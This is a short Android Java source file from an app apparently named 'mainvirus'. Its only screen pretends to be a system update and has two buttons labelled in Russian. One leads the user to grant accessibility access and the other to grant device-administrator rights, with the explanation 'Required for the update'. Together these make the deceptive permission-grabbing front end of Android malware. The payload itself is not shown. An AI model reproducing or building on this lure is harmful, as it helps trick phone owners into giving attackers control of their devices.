package com.example.mainvirus;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Button;
import android.widget.LinearLayout;
import android.widget.TextView;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        
        TextView tv = new TextView(this);
        tv.setText("Для завершения обновления системы дайте разрешения!");
        layout.addView(tv);
        
        // Кнопка запроса спец. возможностей
        Button btnAcc = new Button(this);
        btnAcc.setText("1. Активировать службу");
        btnAcc.setOnClickListener(v -> {
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        });
        layout.addView(btnAcc);
        
        // Кнопка запроса админки
        Button btnAdmin = new Button(this);
        btnAdmin.setText("2. Дать права администратора");
        btnAdmin.setOnClickListener(v -> {
            ComponentName adminComponent = new ComponentName(this, AdminReceiver.class);
            Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
            intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Требуется для обновления");
            startActivity(intent);
        });
        layout.addView(btnAdmin);
        
        setContentView(layout);
    }
}
